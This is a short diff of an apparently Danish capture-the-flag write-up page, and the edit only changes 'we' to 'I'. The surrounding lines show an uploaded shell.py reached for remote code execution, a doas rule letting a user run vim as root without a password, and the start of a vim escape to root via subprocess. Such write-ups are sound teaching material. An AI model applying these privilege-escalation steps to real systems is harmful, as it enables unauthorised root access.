@@ -64,7 +64,7 @@ curl http://keyboard-bashing.hkn/uploads/shell.py     # kører scriptet, viser s
 # ... /usr/bin/doas   &lt;- SUID, OpenBSD-style sudo-erstatning
 cat /etc/doas.conf
 # permit nopass brian as root cmd vim</code></pre>
-             <p>Klassisk GTFOBins vim→shell, men da vi kun har en upload-baseret RCE (ingen interaktiv
+             <p>Klassisk GTFOBins vim→shell, men da jeg kun har en upload-baseret RCE (ingen interaktiv
              pty), bruges vims <code>:!</code>-escape til at køre en shell-kommando og omdirigere output
              til en fil, som læses tilbage ikke-root:</p>
              <pre><code>subprocess.run(["doas","vim","-es",
